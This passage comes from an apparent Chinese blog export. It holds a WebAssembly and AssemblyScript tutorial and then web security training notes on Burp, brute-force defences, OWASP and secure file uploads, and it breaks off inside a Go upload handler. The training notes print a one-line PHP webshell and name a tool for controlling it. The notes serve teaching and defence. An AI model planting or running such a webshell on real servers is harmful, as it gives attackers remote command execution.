<li>火狐的 asm.js 则是取 JS 的子集，JS 引擎针对 asm.js 做性能优化。</li>
</ul>
<p>以上尝试各有优缺点，其中：</p>
<ul>
<li>TypeScript 只是解决了 JS 语法松散的问题，最后还是需要编译成 JS 去运行，对性能没有提升；</li>
<li>Dart 只能在 Chrome 预览版中运行，无主流浏览器支持，用 Dart 开发的人不多；</li>
<li>asm.js 语法太简单、有很大限制，开发效率低。</li>
</ul>
<p>三大浏览器巨头分别提出了自己的解决方案，互不兼容，这违背了 Web 的宗旨； 是技术的规范统一让 Web 走到了今天，因此形成一套新的规范去解决 JS 所面临的问题迫在眉睫。</p>
<p>于是 WebAssembly 诞生了，WebAssembly 是一种新的字节码格式，主流浏览器都已经支持 WebAssembly。和 JS 需要解释执行不同的是，WebAssembly 字节码和底层机器码很相似可快速装载运行，因此性能相对于 JS 解释执行大大提升。 也就是说 WebAssembly 并不是一门编程语言，而是一份字节码标准，需要用高级编程语言编译出字节码放到 WebAssembly 虚拟机中才能运行， 浏览器厂商需要做的就是根据 WebAssembly 规范实现虚拟机。</p>
<h4 id="WebAssembly-原理"><a href="#WebAssembly-原理" class="headerlink" title="WebAssembly 原理"></a>WebAssembly 原理</h4><p>要搞懂 WebAssembly 的原理，需要先搞懂计算机的运行原理。电子计算机都是由电子元件组成，为了方便处理电子元件只存在开闭两种状态，对应着 0 和 1，也就是说计算机只认识 0 和 1，数据和逻辑都需要由 0 和 1 表示，也就是可以直接装载到计算机中运行的机器码。 机器码可读性极差，因此人们通过高级语言 C、C++、Rust、Go 等编写再编译成机器码。</p>
<p>由于不同的计算机 CPU 架构不同，机器码标准也有所差别，常见的 CPU 架构包括 x86、AMD64、ARM，因此在由高级编程语言编译成可自行代码时需要指定目标架构。</p>
<p>WebAssembly 字节码是一种抹平了不同 CPU 架构的机器码，WebAssembly 字节码不能直接在任何一种 CPU 架构上运行，但由于非常接近机器码，可以非常快的被翻译为对应架构的机器码，因此 WebAssembly 运行速度和机器码接近，这听上去非常像 Java 字节码。</p>
<p>相对于 JS，WebAssembly 有如下优点：</p>
<ol>
<li>体积小：由于浏览器运行时只加载编译成的字节码，一样的逻辑比用字符串描述的 JS 文件体积要小很多；</li>
<li>加载快：由于文件体积小，再加上无需解释执行，WebAssembly 能更快的加载并实例化，减少运行前的等待时间；</li>
<li>兼容性问题少：WebAssembly 是非常底层的字节码规范，制订好后很少变动，就算以后发生变化,也只需在从高级语言编译成字节码过程中做兼容。可能出现兼容性问题的地方在于 JS 和 WebAssembly 桥接的 JS 接口。</li>
</ol>
<p>每个高级语言都去实现源码到不同平台的机器码的转换工作是重复的，高级语言只需要生成底层虚拟机(LLVM)认识的中间语言(LLVM IR)，LLVM 能实现：</p>
<ul>
<li>LLVM IR 到不同 CPU 架构机器码的生成；</li>
<li>机器码编译时性能和大小优化。</li>
</ul>
<p>除此之外 LLVM 还实现了 LLVM IR 到 WebAssembly 字节码的编译功能，也就是说只要高级语言能转换成 LLVM IR，就能被编译成 WebAssembly 字节码，目前能编译成 WebAssembly 字节码的高级语言有：</p>
<ul>
<li>AssemblyScript:语法和 TypeScript 一致，对前端来说学习成本低，为前端编写 WebAssembly <a href="http://webassembly.org.cn/">最佳选择</a>；</li>
<li>c\c++:官方推荐的方式;</li>
<li>Rust:语法复杂、学习成本高，对前端来说可能会不适应;</li>
<li>Kotlin:语法和 Java、JS 相似，语言学习成本低;</li>
<li>Golang:语法简单学习成本低。但对 WebAssembly 的支持还处于未正式发布阶段。</li>
</ul>
<p>通常负责把高级语言翻译到 LLVM IR 的部分叫做编译器前端，把 LLVM IR 编译成各架构 CPU 对应机器码的部分叫做编译器后端； 现在越来越多的高级编程语言选择 LLVM 作为后端，高级语言只需专注于如何提供开发效率更高的语法同时保持翻译到 LLVM IR 的程序执行性能。</p>
<h4 id="编写-WebAssembly"><a href="#编写-WebAssembly" class="headerlink" title="编写 WebAssembly"></a>编写 WebAssembly</h4><p>接下来详细介绍如何使用 AssemblyScript 来编写 WebAssembly，实现斐波那契序列的计算。 用 TypeScript 实现斐波那契序列计算的模块 f.ts 如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x: i32</span>): <span class="title">i32</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x === <span class="number">1</span> || x === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f(x - <span class="number">1</span>) + f(x - <span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在按照 <a href="https://github.com/AssemblyScript/assemblyscript#installation">AssemblyScript 提供的安装教程成功安装</a>后， 再通过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">asc f.ts -o f.wasm</span><br></pre></td></tr></table></figure>
<p>就能把以上代码编译成可运行的 WebAssembly 模块。</p>
<p>为了加载并执行编译出的 f.wasm 模块，需要通过 JS 去加载并调用模块上的 f 函数，为此需要以下 JS 代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;f.wasm&#x27;</span>) <span class="comment">// 网络加载 f.wasm 文件</span></span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> res.arrayBuffer()) <span class="comment">// 转成 ArrayBuffer</span></span><br><span class="line">    .then(WebAssembly.instantiate) <span class="comment">// 编译为当前 CPU 架构的机器码 + 实例化</span></span><br><span class="line">    .then(<span class="function"><span class="params">mod</span> =&gt;</span> &#123; <span class="comment">// 调用模块实例上的 f 函数计算</span></span><br><span class="line">    <span class="built_in">console</span>.log(mod.instance.f(<span class="number">50</span>));</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>以上代码中出现了一个新的内置类型 i32，这是 AssemblyScript 在 TypeScript 的基础上内置的类型。AssemblyScript 和 TypeScript 有细微区别，AssemblyScript 是 TypeScript 的子集，为了方便编译成 WebAssembly 在 TypeScript 的基础上加了更严格的类型限制，区别如下：</p>
<ul>
<li>比 TypeScript 多了很多更细致的内置类型，以优化性能和内存占用;</li>
<li>不能使用 any 和 undefined 类型，以及枚举类型；</li>
<li>可空类型的变量必须是引用类型，而不能是基本数据类型如 string、number、boolean；</li>
<li>函数中的可选参数必须提供默认值，函数必须有返回类型，无返回值的函数返回类型需要是 void；</li>
<li>不能使用 JS 环境中的内置函数，只能使用 AssemblyScript 提供的内置函数。</li>
</ul>
<p>总体来说 AssemblyScript 比 TypeScript 又多了很多限制，编写起来会觉得局限性很大； 用 AssemblyScript 来写 WebAssembly 经常会出现 tsc 编译通过但运行 WebAssembly 时出错的情况，这很可能就是你没有遵守以上限制导致的；但 AssemblyScript 通过修改 TypeScript 编译器默认配置能在编译阶段找出大多错误。</p>
<p>AssemblyScript 的实现原理其实也借助了 LLVM，它通过 TypeScript 编译器把 TS 源码解析成 AST，再把 AST 翻译成 IR，再通过 LLVM 编译成 WebAssembly 字节码实现； 上面提到的各种限制都是为了方便把 AST 转换成 LLVM IR。</p>
<h4 id="为什么选-AssemblyScript-作为-WebAssembly-开发语言"><a href="#为什么选-AssemblyScript-作为-WebAssembly-开发语言" class="headerlink" title="为什么选 AssemblyScript 作为 WebAssembly 开发语言"></a>为什么选 AssemblyScript 作为 WebAssembly 开发语言</h4><p>AssemblyScript 相对于 C、Rust 等其它语言去写 WebAssembly 而言，好处除了对前端来说无额外新语言学习成本外，还有对于不支持 WebAssembly 的浏览器，可以通过 TypeScript 编译器编译成可正常执行的 JS 代码，从而实现从 JS 到 WebAssembly 的平滑迁移。</p>
<h4 id="接入-Webpack-构建"><a href="#接入-Webpack-构建" class="headerlink" title="接入 Webpack 构建"></a>接入 Webpack 构建</h4><p>任何新的 Web 开发技术都少不了构建流程，为了提供一套流畅的 WebAssembly 开发流程，接下来介绍接入 Webpack 具体步骤。</p>
<ol>
<li>安装以下依赖，以便让 TS 源码被 AssemblyScript 编译成 WebAssembly。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;assemblyscript&quot;</span>: <span class="string">&quot;github:AssemblyScript/assemblyscript&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assemblyscript-typescript-loader&quot;</span>: <span class="string">&quot;^1.3.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typescript&quot;</span>: <span class="string">&quot;^2.8.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;webpack&quot;</span>: <span class="string">&quot;^3.10.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;webpack-dev-server&quot;</span>: <span class="string">&quot;^2.10.1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>修改 webpack.config.js，加入 loader：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.ts$/</span>,</span><br><span class="line">                loader: <span class="string">&#x27;assemblyscript-typescript-loader&#x27;</span>,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    sourceMap: <span class="literal">true</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>修改 TypeScript 编译器配置 tsconfig.json，以便让 TypeScript 编译器能支持 AssemblyScript 中引入的内置类型和函数。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;extends&quot;</span>: <span class="string">&quot;../../node_modules/assemblyscript/std/portable.json&quot;</span>,</span><br><span class="line">  <span class="string">&quot;include&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;./**/*.ts&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>配置直接继承自 assemblyscript 内置的配置文件。</li>
</ol>
<h4 id="WebAssembly-相关文件格式"><a href="#WebAssembly-相关文件格式" class="headerlink" title="WebAssembly 相关文件格式"></a>WebAssembly 相关文件格式</h4><p>前面提到了 WebAssembly 的二进制文件格式 wasm，这种格式的文件人眼无法阅读，为了阅读 WebAssembly 文件的逻辑，还有一种文本格式叫 wast； 以前面讲到的计算斐波那契序列的模块为例，对应的 wast 文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func $src&#x2F;asm&#x2F;module&#x2F;f (param f64) (result f64)</span><br><span class="line">(local i32)</span><br><span class="line">  get_local 0</span><br><span class="line">  f64.const 1</span><br><span class="line">  f64.eq</span><br><span class="line">  tee_local 1</span><br><span class="line">  if i32</span><br><span class="line">    get_local 1</span><br><span class="line">  else</span><br><span class="line">    get_local 0</span><br><span class="line">    f64.const 2</span><br><span class="line">    f64.eq</span><br><span class="line">  end</span><br><span class="line">  i32.const 1</span><br><span class="line">  i32.and</span><br><span class="line">  if</span><br><span class="line">    f64.const 1</span><br><span class="line">    return</span><br><span class="line">  end</span><br><span class="line">  get_local 0</span><br><span class="line">  f64.const 1</span><br><span class="line">  f64.sub</span><br><span class="line">  call 0</span><br><span class="line">  get_local 0</span><br><span class="line">  f64.const 2</span><br><span class="line">  f64.sub</span><br><span class="line">  call 0</span><br><span class="line">  f64.add</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>这和汇编语言非常像，里面的 f64 是数据类型，f64.eq f64.sub f64.add 则是 CPU 指令。</p>
<p>为了把二进制文件格式 wasm 转换成人眼可见的 wast 文本，需要安装 WebAssembly 二进制工具箱WABT， 在 Mac 系统下可通过 brew install WABT 安装，安装成功后可以通过命令 wasm2wast f.wasm 获得 wast；除此之外还可以通过 wast2wasm f.wast -o f.wasm 逆向转换回去。</p>
<h4 id="WebAssembly-相关工具"><a href="#WebAssembly-相关工具" class="headerlink" title="WebAssembly 相关工具"></a>WebAssembly 相关工具</h4><p>除了前面提到的 WebAssembly 二进制工具箱，WebAssembly 社区还有以下常用工具：</p>
<ul>
<li><a href="http://kripken.github.io/emscripten-site/">Emscripten</a>: 能把 C、C++代码转换成 wasm、asm.js；</li>
<li><a href="https://github.com/WebAssembly/binaryen">Binaryen</a>: 提供更简洁的 IR，把 IR 转换成 wasm，并且提供 wasm 的编译时优化、wasm 虚拟机，wasm 压缩等功能，前面提到的 AssemblyScript 就是基于它。</li>
</ul>
<h4 id="WebAssembly-JS-API"><a href="#WebAssembly-JS-API" class="headerlink" title="WebAssembly JS API"></a>WebAssembly JS API</h4><p>目前 WebAssembly 只能通过 JS 去加载和执行，但未来在浏览器中可以通过像加载 JS 那样 <script src="f.wasm"></script> 去加载和执行 WebAssembly，下面来详细介绍如何用 JS 调 WebAssembly。</p>
<p>JS 调 WebAssembly 分为 3 大步：加载字节码 &gt; 编译字节码 &gt; 实例化，获取到 WebAssembly 实例后就可以通过 JS 去调用了，以上 3 步具体的操作是：</p>
<ol>
<li>对于浏览器可以通过网络请求去加载字节码，对于 Nodejs 可以通过 fs 模块读取字节码文件；</li>
<li>在获取到字节码后都需要转换成 ArrayBuffer 后才能被编译，通过 WebAssembly 通过的 JS API <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/compile">WebAssembly.compile</a> 编译后会通过 Promise resolve 一个 WebAssembly.Module，这个 module 是不能直接被调用的需要；</li>
<li>在获取到 module 后需要通过 WebAssembly.Instance API 去实例化 module，获取到 Instance 后就可以像使用 JS 模块一个调用了。<br>其中的第 2、3 步可以合并一步完成，前面提到的 WebAssembly.instantiate 就做了这两个事情。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">WebAssembly.instantiate(bytes).then(<span class="function"><span class="params">mod</span>=&gt;</span>&#123;</span><br><span class="line">  mod.instance.f(<span class="number">50</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="直接执行-wasm-二进制文件"><a href="#直接执行-wasm-二进制文件" class="headerlink" title="直接执行 wasm 二进制文件"></a>直接执行 wasm 二进制文件</h4><p>前面提到的 Binaryen 提供了在命令行中直接执行 wasm 二进制文件的工具，在 Mac 系统下通过 brew install binaryen 安装成功后，通过 wasm-shell f.wasm 文件即可直接运行。</p>
<h4 id="在-Node-js-中运行"><a href="#在-Node-js-中运行" class="headerlink" title="在 Node.js 中运行"></a>在 Node.js 中运行</h4><p>目前 V8 JS 引擎已经添加了对 WebAssembly 的支持，Chrome 和 Node.js 都采用了 V8 作为引擎，因此 WebAssembly 也可以运行在 Node.js 环境中；</p>
<p>V8 JS 引擎在运行 WebAssembly 时，WebAssembly 和 JS 是在同一个虚拟机中执行，而不是 WebAssembly 在一个单独的虚拟机中运行，这样方便实现 JS 和 WebAssembly 之间的相互调用。</p>
<p>要让上面的例子在 Node.js 中运行，可以使用以下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toUint8Array</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buf.length; ++i) &#123;</span><br><span class="line">        u[i] = buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadWebAssembly</span>(<span class="params">filename, imports</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 读取 wasm 文件，并转换成 byte 数组</span></span><br><span class="line">    <span class="keyword">const</span> buffer = toUint8Array(fs.readFileSync(filename));</span><br><span class="line">    <span class="comment">// 编译 wasm 字节码到机器码</span></span><br><span class="line">    <span class="keyword">return</span> WebAssembly.compile(buffer)</span><br><span class="line">        .then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化模块</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> WebAssembly.Instance(<span class="built_in">module</span>, imports)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">loadWebAssembly(<span class="string">&#x27;../temp/assembly/module.wasm&#x27;</span>)</span><br><span class="line">    .then(<span class="function"><span class="params">instance</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 调用 f 函数计算</span></span><br><span class="line">        <span class="built_in">console</span>.log(instance.exports.f(<span class="number">10</span>))</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>在 Nodejs 环境中运行 WebAssembly 的意义其实不大，原因在于 Nodejs 支持运行原生模块，而原生模块的性能比 WebAssembly 要好。 如果你是通过 C、Rust 去编写 WebAssembly，你可以直接编译成 Nodejs 可以调用的原生模块。</p>
<h4 id="WebAssembly-实际应用"><a href="#WebAssembly-实际应用" class="headerlink" title="WebAssembly 实际应用"></a>WebAssembly 实际应用</h4><p>从上面的内容可见 WebAssembly 主要是为了解决 JS 的性能瓶颈，也就是说 WebAssembly 适合用于需要大量计算的场景，例如：</p>
<ol>
<li>在浏览器中处理音视频，<a href="https://github.com/Bilibili/flv.js/">flv.js</a> 用 WebAssembly 重写后性能会有很大提升；</li>
<li>React 的 dom diff 中涉及到大量计算，用 WebAssembly 重写 React 核心模块能提升性能。Safari 浏览器使用的 JS 引擎 JavaScriptCore 也已经支持 WebAssembly，RN 应用性能也能提升；<br>突破大型 3D 网页游戏性能瓶颈，<a href="https://feday.fequan.com/2017/WebAssembly%E5%9C%A8%E7%99%BD%E9%B9%AD%E5%BC%95%E6%93%8E%E7%9A%84%E5%AE%9E%E8%B7%B5.pdf">白鹭引擎已经开始探索用 WebAssembly</a>。</li>
</ol>
<h4 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h4><ul>
<li><a href="http://webassembly.org.cn/">WebAssembly中文</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Using_the_JavaScript_API">使用 WebAssembly JavaScript API</a></li>
<li><a href="https://github.com/ewasm/design">Ethereum flavored WebAssembly (eWASM) Design</a></li>
<li><a href="https://github.com/ewasm/evm2wasm">Transcompiles EVM code to eWASM</a></li>
</ul>
]]></content>
      <tags>
        <tag>WebAssembly</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全培训</title>
    <url>/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/</url>
    <content><![CDATA[<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Burp 抓包，改包工具， 基于java，运行，需要JRE<br>需要搭梯子才能登录其网站主页，美国公司，商业软件，年费399年费，有社区开源版本<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/1.png"><br>Burp未启动时，网络的路由环境<br>    本地（浏览器） — 服务器<br>Burp启动后，网络的路由环境<br>    本地（浏览器 — Burp） — 服务器<br>Burp extensions — <a href="https://github.com/snoopysecurity/awesome-burp-extensions">https://github.com/snoopysecurity/awesome-burp-extensions</a></p>
<p>DVWA靶场，里面是各种漏洞攻击的介绍和说明，是一个入门的联系资源，英文资源。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/2.png"></p>
<p>Pikachu 漏洞练习平台，同理，中文资源。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/3.png"></p>
<p><a href="https://www.kali.org/">https://www.kali.org/</a> , 一个Linux发行版本，是专门针对各种信息安全任务或者练习而准备的。</p>
<h2 id="前端一切不可靠，如上Burp在客户端做网络流量拦截，做中间人攻击"><a href="#前端一切不可靠，如上Burp在客户端做网络流量拦截，做中间人攻击" class="headerlink" title="前端一切不可靠，如上Burp在客户端做网络流量拦截，做中间人攻击"></a>前端一切不可靠，如上Burp在客户端做网络流量拦截，做中间人攻击</h2><p>对应的措施：<br>1.后端校验；2.前端不做逻辑判断；3.前端加密混淆；4.移动端加壳；5.反调试检测，防止逆向工程; 6.后台数据库存储字段最好经过KMS后端密文，常见的服务器本地算法 — hash(明文+盐值)<br>通常，<a href="http://www.website.com/robots.txt%EF%BC%8C%E5%A6%82">www.website.com/robots.txt，如</a> <a href="https://www.bilibili.com/robots.txt">https://www.bilibili.com/robots.txt</a> ，很多网站都有这样子一个网站URL的列表，表示本网站允许访问的URL。</p>
<p>Burp 启动浏览器，在网站的<a href="http://burp/%E5%9C%B0%E5%9D%80%EF%BC%8C">http://burp/地址，</a><br>在网页右上角点击CA Certificate 下载Burp颁发的证书。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/4.png"></p>
<p>Burp暴力破解，尝试用户名和密码时，可以使用“Repeater”和“Intruder”两个菜单的功能。<br>通常登录成功后，response 的长度会有不同。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/5.png"><br>暴力破解的本质是 自动化，大量发送请求，猜测密码。<br>应对方法：<br>1.要求用户密码设置的复杂度；<br>2.识别爬虫/机器人：验证码，滑块，随机验证码；<br>3.限制登录频率：每次登录n秒以上方可，错误m次后冻结该用户x分钟，这样会带来问题：<br>A.前端限制，通过重置本地数据可以绕过；<br>B.IP地址限制，可能会误封正常用户，攻击者租用地址池拥有大量IP。<br>C.账号限制，会造成正常用户无法登录，恶意攻击者可以制造拒绝服务攻击。<br>4.增加密码强度，特别是增加密码长度是最有效的强度。<br>A.密码一户一用，避免一个密码到处使用，避免撞库攻击。<br>密码的本质是进行身份验证的手段。<br>密码的应用场景是基于以下假设：只有用户和服务器知道该密码<br>其他方式验证身份：短信验证码，指纹，面部识别，USBKEY，2FA，多因子验证等等。</p>
<h2 id="社会工程"><a href="#社会工程" class="headerlink" title="社会工程"></a>社会工程</h2><p>黑客通过社会工程学（Social Engineering）实现攻击的手法多种多样，主要是利用人类的心理弱点和信任机制来获取信息或访问权限。<br>钓鱼攻击，尾随攻击，假冒身份，电话攻击，非技术性攻击，社交媒体欺骗，媒体投影攻击，关系建立攻击等等。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/6.png"></p>
<h2 id="OWASP-—-Open-Web-Application-Security-Project"><a href="#OWASP-—-Open-Web-Application-Security-Project" class="headerlink" title="OWASP — Open Web Application Security Project"></a>OWASP — Open Web Application Security Project</h2><p>OWASP Top 10 提供了Web 安全领域发生最频繁的10种事故。最新版本是 2021 年发布的 — <a href="https://owasp.org/Top10/zh_CN/">https://owasp.org/Top10/zh_CN/</a></p>
<p>WebShell - 以网页形式实现shell的功能，能够对系统进行操作。例如，文件读写，命令执行等。也被称为网页木马。<br>首先，网站如果对用户上传的文件，不做控制，黑客则有可能会上传木马文件，黑客通过木马文件控制后台服务器，如下，<br>通过 <a href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a> 工具可以执行网页木马。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/7.png"><br>执行木马 <?php eval($_POST['cmd']);?> 成功，成功访问到后端服务器的目录和文件。<br><img src="/2024/12/10/Web%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/8.png"></p>
<p>仅仅依赖客户端 JavaScript 验证和服务器端 MIME 类型检查仍然不够安全，因为客户端验证很容易被绕过，而且 MIME 类型本身也可能被伪造，尽管概率较低。 为了构建一个更加严谨的文件上传系统，需要采取更全面的安全措施，将验证和安全检查融入整个上传流程的各个阶段。</p>
<p>一个更严谨的文件上传系统应该包含以下措施：</p>
<ol>
<li>客户端验证 (加强):<br>文件类型检查 (加强): 虽然 file.type 相对可靠，但仍然不是绝对安全的。 可以考虑结合一些额外的检查：<br>文件头部信息检查: 读取文件的前几个字节，检查是否符合已知的文件格式规范。 这需要对不同文件类型的头部结构有深入的了解。 但这仍然只能作为辅助手段，不能完全依赖。<br>更严格的正则表达式: 使用更精确的正则表达式来验证文件名，但这仍然不能防止恶意文件伪装。<br>文件大小限制: 设置一个合理的文件大小限制，并进行客户端验证。<br>用户反馈: 提供清晰的用户反馈，告知用户文件上传失败的原因，例如文件类型不允许、文件大小超过限制等。<br>禁止直接拖拽上传: 避免用户直接拖拽文件到上传区域，强制用户通过“选择文件”按钮选择文件，这样可以更好地控制文件上传过程。</li>
<li>服务器端验证 (多层防御):<br>文件类型检查 (多重验证): 不要仅仅依靠 MIME 类型，结合多种方法进行验证：<br>文件签名: 检查文件的魔术数字 (magic number)，这是一种非常可靠的方法。 不同的文件格式通常有独特的魔术数字。<br>文件内容分析: 对于一些关键的文件类型，可以进行更深入的内容分析，检查文件结构是否符合规范。 这需要根据具体的文件类型定制相应的分析方法。 这可能需要耗费较多资源。<br>文件大小限制: 设置严格的文件大小限制，防止资源耗尽攻击(Denial of Service,DoS)。<br>临时文件存储: 将上传的文件先保存到一个临时目录，然后再进行后续处理，这样可以避免恶意文件直接影响服务器。<br>文件扩展名检查 (补充): 虽然不完全可靠，但作为附加的检查，可以辅助判断文件的类型。<br>内容安全扫描 (关键): 使用专业的安全扫描工具，扫描上传的文件是否包含恶意代码、病毒或其他有害内容。 这可能是最关键的安全步骤，但会增加系统复杂性和成本。 一些云服务提供商提供此类服务。<br>白名单机制: 只允许特定类型的文件上传。 尽量避免使用黑名单，因为黑名单很难完全覆盖所有的恶意文件类型。<br>沙盒环境: 在沙盒环境中执行文件分析，以最大程度地限制恶意代码对服务器的影响。<br>日志记录: 记录所有的文件上传事件，包括文件名、MIME 类型、文件大小、上传时间以及验证结果。 这有助于追踪和分析安全事件。</li>
<li>其他安全措施:<br>HTTPS: 使用 HTTPS 加密上传过程，防止数据被窃取。<br>输入验证: 对所有用户输入进行严格的验证，防止注入攻击。<br>代码安全审计: 定期对代码进行安全审计，查找和修复潜在的安全漏洞。<br>服务端代码示例，如下：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gabriel-vasile/mimetype&quot;</span> <span class="comment">// 用于更准确的 MIME 类型检测</span></span><br><span class="line">	<span class="string">&quot;github.com/google/uuid&quot;</span>             <span class="comment">// 用于生成唯一的文件名</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// AllowedMimeTypes 定义允许上传的文件类型</span></span><br><span class="line"><span class="keyword">var</span> AllowedMimeTypes = <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>&#123;</span><br><span class="line">	<span class="string">&quot;image/jpeg&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="string">&quot;image/png&quot;</span>:  <span class="literal">true</span>,</span><br><span class="line">	<span class="string">&quot;image/gif&quot;</span>:  <span class="literal">true</span>,</span><br><span class="line">	<span class="comment">// 添加其他允许的 MIME 类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MaxFileSize 定义允许上传的最大文件大小 (字节)</span></span><br><span class="line"><span class="keyword">const</span> MaxFileSize = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span> <span class="comment">// 10MB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uploadHandler 处理文件上传请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">uploadHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Method Not Allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>) <span class="comment">// 假设表单字段名为 &quot;file&quot;</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, err.Error(), http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 客户端验证 (加强)</span></span><br><span class="line">	fileName := handler.Filename</span><br><span class="line">	<span class="keyword">if</span> !isValidFileName(fileName) &#123; <span class="comment">// 检查文件名是否合法</span></span><br><span class="line">		http.Error(w, <span class="string">&quot;Invalid file name&quot;</span>, http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span 